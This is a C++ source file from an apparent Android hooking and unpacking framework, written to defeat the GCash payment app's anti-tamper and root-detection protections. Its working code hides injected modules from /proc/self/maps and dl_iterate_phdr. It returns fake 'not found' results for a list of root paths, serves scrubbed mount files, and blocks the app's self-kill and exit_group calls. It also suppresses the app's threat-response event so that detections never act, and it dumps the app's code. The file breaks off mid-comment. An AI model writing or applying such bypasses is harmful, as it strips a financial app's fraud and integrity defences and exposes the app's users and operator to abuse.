// unpacker.cpp — see unpacker.h. INERT until VECTOR_UNPACK_ENABLED.
//
// Orchestration mirrors module.cpp RunTracelessConvert (module.cpp:307): a detached
// worker thread attaches to the ART runtime post-init, does the ART-touching work, then
// exits. Default OFF (gated by persist.kpmhook.unpack); fail-safe to no-op everywhere.

#ifdef VECTOR_UNPACK_ENABLED

#include "unpack/unpacker.h"

#include <dlfcn.h>
#include <fcntl.h>
#include <link.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <unistd.h>
#include <jni.h>       // JNINativeInterface (CallStaticVoidMethodV/A) for the qD2qU3 enforcement intercept

#include <unwind.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <signal.h>
#include <ucontext.h>

#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <set>
#include <string>
#include <thread>

#include <common/logging.h>
#include <dobby.h>  // control-arm backend for the openat probe (persist.kpmhook.unpack.openat_dobby=1)
#include <elf/elf_image.h>  // resolve libc-internal symbols (__openat) from .symtab/.gnu_debugdata

// Traceless KPM backend (defined in native/src/kpm, declared in core/native_api.h). Forward-
// declared here so the openat probe can call kpm_inline_hooker DIRECTLY -- traceless-ONLY, with
// NO Dobby fallback (a Dobby/inline patch gets the process SIGKILL'd by anti-tamper guards).
extern "C" void *kpm_inline_hooker(void *target, void *hooker);
extern "C" int kpm_inline_unhooker(void *func);
// mm-gated maps-hide: filters the page/VMA containing `addr` out of in-process /proc/self/{maps,
// smaps} reads (kernel-side, so it works no matter how the target reads maps). Used to hide the
// injected module .so + trampolines from GCash's libloader maps-scan RASP.
extern "C" int kpm_hide_region(void *addr);
extern "C" int kpm_fshide_arm(int tgid);  // arm shpte fshide (mountinfo/statfs hide) for this tgid
extern "C" int kpm_exittarget_arm(int tgid);  // arm shpte do_exit (exit_group self-kill neutralize) for this tgid
extern "C" void kpm_hook_force_enable(void);  // bypass proc_is_target gate so KPM engages for GCash
#include "gcash_got_detox.h"              // g_got_detox[] : (got_off, libc_off) captured from a clean run
// Identify this process to the KPM's proc_is_target() gate (which compares against
// persist.kpmhook.target). Vector's normal path sets this in module.cpp, but only AFTER
// StartIfEnabled and only for in-scope apps -- so the traceless worker must set it itself
// or the gate latches g_init_failed on the stale "zygote64" cmdline.
extern "C" void kpm_hook_set_process_name(const char *name);
// Rev1-(1): host every traceless clone in VMA-less kernel memory (KPM `pghookg`) instead of
// an anon RX mmap, so the recompiled hook code is unreachable by maps/mincore enumeration.
// Off by default in the backend; enabled once in StartIfEnabled. Safe: on a pre-0.6.2 KPM the
// pghookg reply isn't "ok", the hook returns NULL, and we fall back exactly as before.
extern "C" void kpm_hook_set_ghost(int on);
// fs-hide: register this process's tgid so the KPM spoofs its statfs f_type (overlayfs->erofs) and
// drops overlay/magisk lines from its mountinfo -- defeats the "hidden overlayfs" mount detection.
// Needs shpte KPM >= v0.6.6 (older KPM replies "usage:" -> harmless no-op). Gated persist.kpmhook.fshide.
extern "C" void kpm_hook_fshide_enable(void);

#include "unpack/active_invoke.h"     // ActiveInvokeAllMethods (Tier-C reflective active-invoke)
#include "unpack/art_internal.h"      // CalibrateForMethodEnum (increment-2)
#include "unpack/choke_hook.h"        // ChokePoint
#include "unpack/class_dex_finder.h"  // FindAndDumpClassDexes + GetEnumeratedClassDefs
#include "unpack/codeitem_sink.h"
#include "unpack/interp_capture.h"    // CaptureInterpreted (direction-1 increment-2c)
#include "unpack/method_enumerator.h" // Tier, EnumerateAndDrive

namespace vector::native::unpack {

namespace {

// Prop-gated run config (fully internal; the public header exposes only StartIfEnabled).
struct Config {
    bool enabled = false;                                  // persist.kpmhook.unpack = 1
    Tier tier = Tier::kPassive;                            // .tier = A|B|C (P0 = A)
    bool stealth = false;                                  // .stealth = 0|1
    ChokePoint choke = ChokePoint::kArtMethodGetCodeItem;  // .choke = getcodeitem|invoke|bridge|execute
    bool dexfind = false;                                  // .dexfind = 1 (direction-1 increment-1)
    bool trigger = false;                                  // .trigger = 1 (increment-2 per-method restore)
    bool interp = false;                                   // .interp = 1 (increment-2c interpreter capture)
    bool active_load = false;                              // .activeload = 1 (increment-2d force-load all classes)
    bool invoke = false;                                   // .invoke = 1 (Tier-C reflective active-invoke of every method)
    int invoke_ms = 60000;                                 // .invoke_ms (active-invoke wall-time budget)
    int invoke_residual_ms = 3000;                         // .invoke_residual_ms (interp window kept open after the driver)
    bool extout = false;                                   // .extout = 1 (write dumps to app EXTERNAL dir, pullable past SELinux MLS)
    bool traceless = false;                                // .traceless = 1 (KPM clone hook for dexfind FindClass; RASP-safe)
    bool openat_probe = false;                             // .openat = 1 (traceless openat probe; frida-parallel)
    int openat_ms = 20000;                                 // .openat_ms (probe window)
    bool openat_dobby = false;                             // .openat_dobby = 1 (control arm: DobbyHook not KPM)
    bool gcash_fix = false;                                // .gcashfix = 1 (KPM-traceless neutralize GCash Ant-APSE libloader RASP)
    unsigned long gcash_off = 0x1d0bb0;                    // .gcashoff (libloader detect-fn offset; RE: FUN_002d0bb0)
};

// ---- openat traceless probe (frida-parallel; persist.kpmhook.unpack.openat=1) ---------------
// Installs a KPM-TRACELESS inline hook on libc openat and logs DISTINCT file paths for a window.
// Proves a Vector traceless hook SURVIVES + captures data on an app where frida and a Dobby hook
// both get the process killed. Traceless-only: if kpm_inline_hooker fails (bridge down) we skip
// rather than fall back to Dobby (which would trip the anti-tamper SIGKILL).
std::mutex g_oa_mu;
std::set<std::string> g_oa_seen;
std::atomic<uint64_t> g_open_hits{0};
std::atomic<uint64_t> g_openat_hits{0};
thread_local bool g_oa_in = false;
using OpenFn = int (*)(const char *, int, int);
using OpenatFn = int (*)(int, const char *, int, int);
OpenFn g_open_orig = nullptr;
OpenatFn g_openat_orig = nullptr;

void RecordPath(const char *tag, const char *path, int flags, int fd) {
    if (g_oa_in || !path) return;
    g_oa_in = true;  // re-entrancy guard: LOGI below may itself open() the logd socket once
    std::string p(path);
    bool fresh;
    {
        std::lock_guard<std::mutex> lk(g_oa_mu);
        fresh = g_oa_seen.insert(p).second;
    }
    if (fresh) LOGI("[openat] ({}) {} flags=0x{:x} -> fd={}", tag, p.c_str(), flags, fd);
    g_oa_in = false;
}

int OpenProbeHook(const char *path, int flags, int mode) {
    int fd = g_open_orig ? g_open_orig(path, flags, mode) : -1;
    g_open_hits.fetch_add(1, std::memory_order_relaxed);
    RecordPath("open", path, flags, fd);
    return fd;
}

int OpenatProbeHook(int dirfd, const char *path, int flags, int mode) {
    int fd = g_openat_orig ? g_openat_orig(dirfd, path, flags, mode) : -1;
    g_openat_hits.fetch_add(1, std::memory_order_relaxed);
    RecordPath("openat", path, flags, fd);
    return fd;
}

// --- __system_property_find capture: RASP looks up ro.*/gsm.*/net.* props by name here for
// emulator / cloud-phone / rom / proxy fingerprinting (bypasses open/openat: the prop area is
// mmap'd). Hooking find (name lookup) rather than the hotter get; we only need which NAMEs are
// queried (values we read back with getprop). Logs each distinct name once.
std::mutex g_prop_mu;
std::set<std::string> g_prop_seen;
thread_local bool g_prop_in = false;
using PropFindFn = const void *(*)(const char *);
PropFindFn g_propfind_orig = nullptr;

const void *PropFindProbeHook(const char *name) {
    const void *r = g_propfind_orig ? g_propfind_orig(name) : nullptr;
    if (!g_prop_in && name) {
        g_prop_in = true;  // LOGI -> logd may itself look up a prop once
        bool fresh;
        {
            std::lock_guard<std::mutex> lk(g_prop_mu);
            fresh = g_prop_seen.insert(name).second;
        }
        if (fresh) LOGI("[propfind] {}", name);
        g_prop_in = false;
    }
    return r;
}

// Hook one libc symbol via the chosen backend; store its backup(orig) via `store`. Returns the
// hooked address (for later unhook) or nullptr on failure. use_dobby=false -> KPM traceless (no
// Dobby fallback); use_dobby=true -> DobbyHook inline patch (the frida-parallel A/B CONTROL arm:
// an inline patch is what an anti-tamper code-integrity scan is meant to catch).
void *HookLibcFn(const char *sym, void *hook, void (*store)(void *), bool use_dobby) {
    void *addr = dlsym(RTLD_DEFAULT, sym);
    if (!addr) {
        // dlsym fails from an app's restricted linker namespace -> resolve openat/open by
        // parsing libc.so's .dynsym directly (same path dexfind uses for libart).
        static vector::native::ElfImage libc("libc.so");
        if (libc.IsValid()) addr = libc.getSymbAddress<void *>(sym);
    }
    if (!addr) {
        LOGW("[openat] resolve({}) failed (dlsym + ElfImage libc)", sym);
        return nullptr;
    }
    void *backup = nullptr;
    if (use_dobby) {
        if (DobbyHook(addr, reinterpret_cast<dobby_dummy_func_t>(hook),
                      reinterpret_cast<dobby_dummy_func_t *>(&backup)) != 0) {
            LOGW("[openat] DobbyHook({}) failed", sym);
            return nullptr;
        }
    } else {
        backup = kpm_inline_hooker(addr, hook);
        if (!backup) {
            LOGW("[openat] kpm_inline_hooker({}) FAILED (bridge down / not gated) -- traceless-only", sym);
            return nullptr;
        }
    }
    store(backup);
    LOGI("[openat] {} hook on {} @ {} (backup={})", use_dobby ? "DOBBY" : "TRACELESS", sym, addr, backup);
    return addr;
}

void RunOpenatProbe(int window_ms, bool use_dobby) {
    LOGI("[openat] backend = {}", use_dobby ? "DOBBY inline-patch (control arm)" : "KPM-TRACELESS");
    // Hook BOTH open and openat: bionic routes many file opens through open()->__openat, which
    // bypasses the public openat symbol -- so hooking openat alone under-captures. Per-fn hit
    // counters disambiguate "the reroute/patch never fired" from "that symbol was just cold".
    void *open_addr =
        HookLibcFn("open", reinterpret_cast<void *>(&OpenProbeHook),
                   [](void *b) { g_open_orig = reinterpret_cast<OpenFn>(b); }, use_dobby);
    void *openat_addr =
        HookLibcFn("openat", reinterpret_cast<void *>(&OpenatProbeHook),
                   [](void *b) { g_openat_orig = reinterpret_cast<OpenatFn>(b); }, use_dobby);
    void *propget_addr =
        HookLibcFn("__system_property_find", reinterpret_cast<void *>(&PropFindProbeHook),
                   [](void *b) { g_propfind_orig = reinterpret_cast<PropFindFn>(b); }, use_dobby);
    if (!open_addr && !openat_addr && !propget_addr) {
        LOGW("[openat] no hook installed -- abort probe");
        return;
    }
    LOGI("[openat] logging distinct paths for {}ms ...", window_ms);
    usleep((useconds_t)window_ms * 1000);
    if (use_dobby) {
        // Do NOT DobbyDestroy: open is hot (100s of calls/window); unpatching while an app
        // thread is inside the trampoline spins/hangs the worker (same hazard as the interp
        // Execute hook). The control arm only needs the survival signal, so leave it patched.
        LOGI("[openat] (dobby control arm: hooks left installed -- hot-fn destroy would hang)");
    } else {
        // The SAME hot-function hazard applies to the KPM traceless arm -- and it is worse here:
        // kpm_inline_unhooker sends `pgunhook`, which clears the target page's UXN trap in the KPM.
        // open/openat/__system_property_find fire from MANY app threads (100s/window), so at
        // teardown there are almost certainly do_page_fault reroutes IN FLIGHT on those very pages;
        // clearing the trap out from under them races the kernel fault path and crashes the app
        // (observed on c66app / NetEase Yidun: SIGSEGV with kpm_inline_unhooker on the stack -- same
        // class of teardown race as shpte maps-hide). The probe window itself survives fine; only
        // the unhook killed the process. This run is an isolated diagnostic (openat mode returns
        // right after), so there is nothing to unwind for: LEAVE the traceless hooks installed,
        // mirroring the Dobby arm. They stay benign -- each distinct path/prop-name logs once
        // (deduped set), the g_*_orig backups live in the kept clone for the process lifetime, and
        // process death clears the KPM hooks. A subsequent unpack run is a fresh app start anyway.
        LOGI("[openat] (traceless arm: hooks left installed -- unhooking a hot KPM-trapped page "
             "would race do_page_fault teardown; process exit clears them)");
    }
    {
        std::lock_guard<std::mutex> lk(g_prop_mu);
        LOGI("[propfind] {} distinct property name(s) looked up", g_prop_seen.size());
    }
    size_t n;
    {
        std::lock_guard<std::mutex> lk(g_oa_mu);
        n = g_oa_seen.size();
    }
    LOGI("[openat] done: open fired {}x, openat fired {}x, {} distinct path(s); {}",
         g_open_hits.load(), g_openat_hits.load(), n,
         use_dobby ? "dobby hooks LEFT installed" : "traceless hooks LEFT installed");
}

bool PropIs(const char *name, char want) {
    char v[PROP_VALUE_MAX] = {0};
    return __system_property_get(name, v) > 0 && v[0] == want;
}

int PropInt(const char *name, int dflt) {
    char v[PROP_VALUE_MAX] = {0};
    if (__system_property_get(name, v) <= 0 || !v[0]) return dflt;
    int n = atoi(v);
    return n > 0 ? n : dflt;
}

// stealth=0 (Dobby) gate: only run in the process named by persist.kpmhook.target. If the
// prop is unset/empty, allow (caller already limits to Vector's injection scope). NOTE:
// /proc/self/cmdline is still "zygote64" at postAppSpecialize time, so the caller passes the
// real nice name. The stealth=1 path is additionally gated by the KPM itself.
bool ProcessMatchesTarget(const char *process_name) {
    char want[PROP_VALUE_MAX] = {0};
    if (__system_property_get("persist.kpmhook.target", want) <= 0 || !want[0]) return true;
    return process_name && strcmp(process_name, want) == 0;
}

Tier ParseTier() {
    char v[PROP_VALUE_MAX] = {0};
    if (__system_property_get("persist.kpmhook.unpack.tier", v) <= 0) return Tier::kPassive;
    switch (v[0]) {
        case 'B': case 'b': return Tier::kForceCompile;
        case 'C': case 'c': return Tier::kInvoke;
        case 'A': case 'a': default: return Tier::kPassive;
    }
}

ChokePoint ParseChoke() {
    char v[PROP_VALUE_MAX] = {0};
    if (__system_property_get("persist.kpmhook.unpack.choke", v) <= 0)
        return ChokePoint::kArtMethodGetCodeItem;
    if (v[0] == 'i') return ChokePoint::kArtMethodInvoke;
    if (v[0] == 'b') return ChokePoint::kInterpreterBridge;
    if (v[0] == 'e') return ChokePoint::kExecute;
    return ChokePoint::kArtMethodGetCodeItem;
}

// ---- GCash Ant-APSE libloader RASP neutralize (persist.kpmhook.unpack.gcashfix=1) -----------
// RE (subagent): libloader = Ant/Alipay APSE packer; FUN_002d0bb0 @ off 0x1d0bb0 decrypts the
// string "/proc/self/maps", reads it, strcasecmp-scans each line vs a blocklist, returns w20=1 on
// a hit (an injected .so) -> falls through to _exit. libloader SELF-CRCs its .text, so a
// Dobby/inline patch is detected (each extra hook killed GCash faster). The KPM whole-page clone
// hook leaves the ORIGINAL .text byte-identical (self-CRC reads pass) while rerouting EXECUTION to
// the clone -> traceless-hook the detect fn to just return 0 (clean verdict), so libloader never
// self-exits. Offset is prop-overridable (persist.kpmhook.unpack.gcashoff) for iteration.
uintptr_t FindLibBase(const char *name) {
    FILE *f = fopen("/proc/self/maps", "re");
    if (!f) return 0;
    char line[600];
    uintptr_t base = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name)) {
            uintptr_t s = strtoul(line, nullptr, 16);
            if (s && (base == 0 || s < base)) base = s;
        }
    }
    fclose(f);
    return base;
}

// A maps line is an injected/anomalous region libloader's RASP would flag: a module .so under
// /data/adb/modules (zygisk_vector / zygisksu / phoenix / riru), or a lone rwxp anon page (an
// LSPlant trampoline / KPM clone). We do NOT hide libloader itself or app/system libs.
bool MapsLineIsInjected(const char *line) {
    if (strstr(line, "/data/adb/") || strstr(line, "zygisk") || strstr(line, "riru") ||
        strstr(line, "libphoenix") || strstr(line, "/vector"))
        return true;
    // lone rwxp anon (no pathname): perms field "rwxp" and the line has no '/'
    const char *sp = strchr(line, ' ');
    if (sp && strncmp(sp + 1, "rwxp", 4) == 0 && !strchr(line, '/') && !strstr(line, "[anon:"))
        return true;
    return false;
}

// ---- next-layer diagnosis + neutralize: the SIGKILL that fires after maps-scan is defeated ----
// KPM-traceless-hook libc kill/tgkill: block a lethal self-directed signal (the RASP's kill path)
// and unwind-log the caller so we can identify + locate the NEXT detection. Traceless (KPM clone)
// so libloader's .text/libc self-CRC stays clean.
struct GcBt { void **f; int n; int max; };
static _Unwind_Reason_Code GcTraceCb(struct _Unwind_Context *c, void *a) {
    GcBt *s = reinterpret_cast<GcBt *>(a);
    void *pc = reinterpret_cast<void *>(_Unwind_GetIP(c));
    if (pc && s->n < s->max) s->f[s->n++] = pc;
    return s->n >= s->max ? _URC_END_OF_STACK : _URC_NO_REASON;
}
void GcLogCaller(const char *what, int arg) {
    void *fr[8];
    GcBt st{fr, 0, 8};
    _Unwind_Backtrace(GcTraceCb, &st);
    LOGW("[gcashfix] BLOCK {}({}) — caller chain:", what, arg);
    for (int i = 0; i < st.n; i++) {
        Dl_info di;
        if (dladdr(fr[i], &di) && di.dli_fname) {
            const char *b = strrchr(di.dli_fname, '/');
            b = b ? b + 1 : di.dli_fname;
            LOGW("[gcashfix]   #{} {}+0x{:x}", i, b,
                 (unsigned long)fr[i] - (unsigned long)di.dli_fbase);
        }
    }
}
// dl_iterate_phdr module-enumeration filter: libloader's SECOND way to find injected modules
// (walks the linker's in-memory link_map, NOT /proc/self/maps -> maps-hide can't touch it). Hook
// it (KPM-traceless) and drop injected modules from the callback so the scan sees a clean set.
struct GcDlWrap { int (*cb)(struct dl_phdr_info *, size_t, void *); void *data; };
int GcDlFilterCb(struct dl_phdr_info *info, size_t size, void *data) {
    GcDlWrap *w = reinterpret_cast<GcDlWrap *>(data);
    const char *n = info->dlpi_name;
    if (n && (strstr(n, "zygisk") || strstr(n, "/data/adb") || strstr(n, "libphoenix") ||
              strstr(n, "riru") || strstr(n, "/vector")))
        return 0;  // skip injected module (don't surface it to the real callback)
    return w->cb(info, size, w->data);
}
int (*g_gc_orig_dlip)(int (*)(struct dl_phdr_info *, size_t, void *), void *) = nullptr;
extern "C" int GcashDlIterateHook(int (*cb)(struct dl_phdr_info *, size_t, void *), void *data) {
    if (!g_gc_orig_dlip) return -1;
    GcDlWrap w{cb, data};
    return g_gc_orig_dlip(GcDlFilterCb, &w);
}

void GcDumpJavaStack(const char *why);  // fwd (defined below, near the kill hooks)
// Shamiko-style root-file hiding: GCash's Java root detection (File.exists/canRead) resolves to
// libc faccessat/fstatat. Return ENOENT for known root paths so the scan finds a clean device.
static bool GcIsRootPath(const char *p) {
    if (!p) return false;
    static const char *bl[] = {
        "/debug_ramdisk", "/data/adb", "/sbin/su", "/system/bin/su", "/system/xbin/su",
        "/vendor/bin/su", "/product/bin/su", "/su/bin", "vsync_svc_hlpr", "/dev/su",
        "/data/local/tmp/su", "supersu", "SuperSU", "/system/app/Superuser", "busybox",
        "magisk", ".magisk", "riru", "zygisk", "lsposed", "xposed", "apatch", "/data/adb/ap",
        "kernelsu", "/system/xbin/busybox", "/cache/su", nullptr};
    for (int i = 0; bl[i]; i++)
        if (strstr(p, bl[i])) return true;
    return false;
}
int (*g_gc_orig_faccessat)(int, const char *, int, int) = nullptr;
int (*g_gc_orig_fstatat)(int, const char *, void *, int) = nullptr;
int (*g_gc_orig_openat)(int, const char *, int, int) = nullptr;
// A mount/proc line that would reveal root (module mounts, overlay, /data/adb, magisk, su path).
static bool GcMountLineDirty(const char *line) {
    if (strstr(line, "/data/adb") || strstr(line, "magisk") || strstr(line, "overlay") ||
        strstr(line, "meta-overlayfs") || strstr(line, "vsync_svc_hlpr") || strstr(line, "riru") ||
        strstr(line, "KSU") || strstr(line, "zygisk") || strstr(line, "/debug_ramdisk") ||
        strstr(line, "libphoenix") || strstr(line, "/vector"))
        return true;
    // maps: a lone rwxp anon region (KPM clone / LSPlant trampoline) -- exec+writable, no path.
    const char *sp = strchr(line, ' ');
    if (sp && strncmp(sp + 1, "rwxp", 4) == 0 && !strchr(line, '/') && !strstr(line, "[anon:"))
        return true;
    return false;
}
// Hook __openat: for /proc/{mounts,self/mountinfo,self/mounts}, return a memfd holding the file
// with root-revealing lines filtered out. Java File reads (open()->__openat) then see a clean view.
extern "C" int GcashOpenatHook(int dirfd, const char *path, int flags, int mode) {
    if (path && (strstr(path, "/proc/") || strstr(path, "/sys/")) &&
        !strstr(path, "/proc/self/task") && !strstr(path, "cgroup"))
        LOGI("[gcashfix] OPEN {}", path);  // diagnostic: what /proc,/sys does GCash read?
    // NOTE: /proc/self/maps is NOT sanitized here -- the kernel maps-hide (kpm_hide_region) filters
    // its content in-kernel, so readlink(/proc/self/fd/N) still shows the real path (a memfd
    // substitution would be detectable via /proc/self/fd, which RASPs scan). Only /proc/mounts
    // (rarely readlink'd) goes through the memfd path.
    if (path && g_gc_orig_openat &&
        (strstr(path, "/proc/mounts") || strstr(path, "/proc/self/mountinfo") ||
         strstr(path, "/proc/self/mounts") || strstr(path, "/proc/1/mounts"))) {
        int real = g_gc_orig_openat(dirfd, path, O_RDONLY | O_CLOEXEC, 0);
        if (real >= 0) {
            std::string clean;
            char buf[8192];
            std::string cur;
            ssize_t n;
            while ((n = read(real, buf, sizeof(buf))) > 0) cur.append(buf, n);
            close(real);
            size_t start = 0;
            while (start < cur.size()) {
                size_t nl = cur.find('\n', start);
                if (nl == std::string::npos) nl = cur.size();
                std::string line = cur.substr(start, nl - start);
                if (!GcMountLineDirty(line.c_str())) { clean += line; clean += '\n'; }
                start = nl + 1;
            }
            int mfd = syscall(__NR_memfd_create, "m", 0);
            if (mfd >= 0) {
                write(mfd, clean.data(), clean.size());
                lseek(mfd, 0, SEEK_SET);
                return mfd;
            }
        }
    }
    return g_gc_orig_openat ? g_gc_orig_openat(dirfd, path, flags, mode) : -1;
}
std::atomic<int> g_gc_stack_dumps{0};
extern "C" int GcashFaccessatHook(int dirfd, const char *path, int mode, int flags) {
    if (GcIsRootPath(path)) {
        LOGI("[gcashfix] HIDE access({})", path ? path : "?");
        if (g_gc_stack_dumps.fetch_add(1) < 2) GcDumpJavaStack("root-file scan (access)");
        errno = ENOENT;
        return -1;
    }
    return g_gc_orig_faccessat ? g_gc_orig_faccessat(dirfd, path, mode, flags) : -1;
}
extern "C" int GcashFstatatHook(int dirfd, const char *path, void *buf, int flags) {
    if (GcIsRootPath(path)) { LOGI("[gcashfix] HIDE stat({})", path ? path : "?"); errno = ENOENT; return -1; }
    return g_gc_orig_fstatat ? g_gc_orig_fstatat(dirfd, path, buf, flags) : -1;
}


// Dump the CURRENT thread's Java stack (the thread that called Process.killProcess / decided to
// finish) -> reveals which GCash class/method drives the close. Uses vm->GetEnv (the calling thread
// is a live app Java thread, already attached). PROOF, not inference.
JavaVM *g_gc_vm = nullptr;
void GcDumpJavaStack(const char *why) {
    if (!g_gc_vm) return;
    JNIEnv *env = nullptr;
    if (g_gc_vm->GetEnv(reinterpret_cast<void **>(&env), JNI_VERSION_1_6) != JNI_OK || !env) return;
    if (env->ExceptionCheck()) env->ExceptionClear();
    jclass thrCls = env->FindClass("java/lang/Thread");
    jclass steCls = env->FindClass("java/lang/StackTraceElement");
    if (!thrCls || !steCls) { env->ExceptionClear(); return; }
    jmethodID curThr = env->GetStaticMethodID(thrCls, "currentThread", "()Ljava/lang/Thread;");
    jmethodID getStk = env->GetMethodID(thrCls, "getStackTrace", "()[Ljava/lang/StackTraceElement;");
    jmethodID toStr = env->GetMethodID(steCls, "toString", "()Ljava/lang/String;");
    if (!curThr || !getStk || !toStr) { env->ExceptionClear(); return; }
    jobject thr = env->CallStaticObjectMethod(thrCls, curThr);
    jobjectArray stk = reinterpret_cast<jobjectArray>(env->CallObjectMethod(thr, getStk));
    if (!stk) { env->ExceptionClear(); return; }
    jsize n = env->GetArrayLength(stk);
    LOGW("[gcashfix] JAVA STACK at {} ({} frames):", why, (int)n);
    for (jsize i = 0; i < n && i < 30; i++) {
        jobject ste = env->GetObjectArrayElement(stk, i);
        jstring s = reinterpret_cast<jstring>(env->CallObjectMethod(ste, toStr));
        if (s) {
            const char *cs = env->GetStringUTFChars(s, nullptr);
            LOGW("[gcashfix]   #{} {}", (int)i, cs ? cs : "?");
            if (cs) env->ReleaseStringUTFChars(s, cs);
        }
        env->DeleteLocalRef(ste);
        if (s) env->DeleteLocalRef(s);
    }
    if (env->ExceptionCheck()) env->ExceptionClear();
}

static bool GcLethal(int sig) { return sig == 9 || sig == 6 || sig == 4 || sig == 11; }
int (*g_gc_orig_kill)(pid_t, int) = nullptr;
int (*g_gc_orig_tgkill)(int, int, int) = nullptr;
// BLOCK the self-directed lethal signal. The RE-confirmed kill is Java `Process.killProcess(self)`
// -> Process.sendSignal -> libc kill(pid,9); no-op'ing it just returns to GCash's Java code (void,
// no return check) so the app keeps running -- unlike libloader's NATIVE self-kill (which we avoid
// triggering by hiding the injection via maps-hide + dl_iterate). Return 0 = "signal sent OK".
extern "C" int GcashKillHook(pid_t pid, int sig) {
    if (GcLethal(sig) && (pid == getpid() || pid <= 0)) {
        GcLogCaller("kill", sig);
        GcDumpJavaStack("kill(self)");
        return 0;
    }
    return g_gc_orig_kill ? g_gc_orig_kill(pid, sig) : -1;
}
extern "C" int GcashTgkillHook(int tgid, int tid, int sig) {
    if (GcLethal(sig) && (tgid == getpid() || tgid <= 0)) {
        GcLogCaller("tgkill", sig);
        GcDumpJavaStack("tgkill(self)");
        return 0;
    }
    return g_gc_orig_tgkill ? g_gc_orig_tgkill(tgid, tid, sig) : -1;
}

// Neuter Appdome's "BC-SHA" periodic integrity monitor's self-kill decision. Device+IDA RE
// (gcash_exitcaller: the 18s native exit_group came from libloader, chain sub_44CC30->44ADF0->
// 44C0B8->44C69C->exit_group; the ~300-thread "BC-SHA" monitor mesh (sub_4585B4/sub_451324, 5s
// cycle) accumulates a detection count -> sub_458598/dword_9B7614 -> when >=1 these decision fns
// drive a NATIVE exit_group(0) self-exit ~18s after start). It is NOT the maps-scan detect fn
// (0x1d0bb0), NOT gated by the fuse master-gate (dword_9422D4&0x100000), and blocking exit_group
// crashes libloader -- so the ONLY clean fix is to neuter the DECISION. Traceless-hook the decision
// fns to return 0 (clean verdict); .text stays byte-identical (KPM region clone) so libloader's own
// self-CRC / BC-SHA integrity hash sees no tampering. Offsets are from libloader_decrypted.so
// (imagebase 0), which matches the on-device libloader.so layout (RE-confirmed: exit_group svc at
// +0x34c27c == sub_34C274).
extern "C" long GcashMonitorStub(void) { return 0; }

// EXIT-GROUP CHOKE-POINT neutralizer. RE + runtime exitcaller-backtrace (2026-09-24) confirmed the
// ~18s "exited cleanly (0)" death is the Appdome periodic monitor thread (root libloader+0x38f39c)
// reaching sub_44C69C, which calls sub_35CC70(0) -> sub_34C274 = linux_eabi_syscall(94) = exit_group(0).
// sub_35CC70 (libloader+0x35CC70) is the SINGLE 12-byte wrapper through which ALL ~9 Appdome exit_group
// self-kill sites funnel (its only callee sub_34C274 is the exit_group svc stub, called from nowhere
// else). Traceless-hooking it to just RETURN (never issue the syscall) blocks every exit_group suicide
// with ZERO .text modification (KPM region clone -> self-CRC/BC-SHA hash clean). Unlike neutering a
// DECISION fn (GcashMonitorStub -> crash), sub_35CC70 is a pure leaf syscall wrapper: skipping the
// syscall drops no cleanup, the caller (sub_44C69C) just continues via `return sub_44C770(v5)`. The
// monitor thread then loops and re-attempts every ~5s, each attempt harmlessly no-op'd.
//
// IMPORTANT: we must NOT return to the caller. sub_44C69C's tail is `v5=sub_35CC70(0);
// return sub_44C770(v5);` where sub_44C770 is the post-exit DEAD-CODE death-report builder (heavy
// string-decrypt + a `*(ctx+1336)` vtable call + a tail sub_44CBC8 -> sub_44CC30 -> another
// exit_group). It is only ever reached because sub_35CC70 normally never returns; letting it run in
// that unexpected state SIGSEGVs (RE + device-confirmed 2026-09-24: return-0 stub -> signal 11).
// So instead of returning we PARK the calling (monitor) thread forever -> the report dead-code never
// runs, the process stays alive, and that one monitor thread just stalls.
extern "C" long GcashExitStub(void) { for (;;) pause(); return 0; }

// [PRIMARY enforcement choke] Appdome's detection->response EVENT BUS. RE (IDA libloader 2026-09-28 +
// LIVE byte-verify: 6.03.1 libloader is byte-for-byte identical to 6.03.0 @0x131FC8 -- the Appdome-fused
// libloader.so did NOT change between the two GCash releases, so this offset is valid on-device):
//   sub_131FC8(long event_id, long payload): scans a descriptor table [unk_7B9FCC..byte_7BAFFC] and,
//   for every entry whose id field == event_id, calls entry.handler(payload); returns the input id when
//   nothing matches. EVERY native detection (anti-debug sub_254088, threshold/multi-inst sub_348490,
//   handle/thread + frida-port sub_546BBC, proxy sub_2FD904, ...) emits event id 82 (0x52) here to
//   dispatch its enforcement RESPONSE. This bus is NOT gated by any fuse bit -- that is why defusing the
//   crash fuse dword_9422D4&0x100000 alone left the "soft" enforcement (Java qwHjo5.qD2qU3 -> threat
//   toast + Activity.finish() on the splash, confirmed via logcat "Toast already killed" + CLOSE
//   transition after ~9s of clean init) still firing. Suppressing id 82 turns every detection into a
//   no-op response while leaving the detection code and all benign event ids intact. We return the input
//   id -- exactly the function's own natural "no matching handler" outcome -- so callers see a valid,
//   in-band return value (unlike exit_group's dead-code caller, this fn is designed to return normally).
//   Gated persist.kpmhook.unpack.gcasheventbus, DEFAULT ON (this is the treat-the-root kill switch).
long (*g_gc_orig_eventbus)(long, long) = nullptr;
extern "C" long GcashEventBusHook(long event_id, long payload) {
    if (event_id == 82) {
        static std::atomic<int> n{0};
        if (n.fetch_add(1) < 40)
            LOGI("[gcasheb] suppress threat event id=82 payload={:#x}", (unsigned long) payload);
        return event_id;   // mimic the "no matching handler" no-op return path
    }
    return g_gc_orig_eventbus ? g_gc_orig_eventbus(event_id, payload) : event_id;
}

// [PRIMARY enforcement intercept] Drop the Appdome qwHjo5.qD2qU3 JNI enforcement dispatch. The tamper
// verdict is decided in native (libloader/libnyadgfpeuju; the threat strings are ENCRYPTED so logcat
// can't say what fired) and delivered into Java via
//   env->CallStaticVoidMethod(qwHjo5_class, qD2qU3_mid, title,body, kill,exit,report, s,s,s)
// -> runOnUiThread -> threat toast + Activity.finish() on the splash + sets the static kill-flag
// (g1h2i3j4k5l6m7n8o9p0). We inline-hook the JNIEnv CallStaticVoidMethodV/A libart functions (a single
// shared JNINativeInterface table -> the hook is process-wide, every thread) and DROP any call whose
// method is qD2qU3. Identify it by resolving GetStaticMethodID("qD2qU3", sig) ON THE clazz ARG passed in
// (the class is already resolved and handed to us -> no app-classloader lookup needed) and matching the
// incoming jmethodID; cache on first hit -> O(1) pointer compare after. Trigger-AGNOSTIC: whatever native
// detection fired, the enforcement can never reach the UI. No LSPlant / no new ClassLoader (the cb8nT4
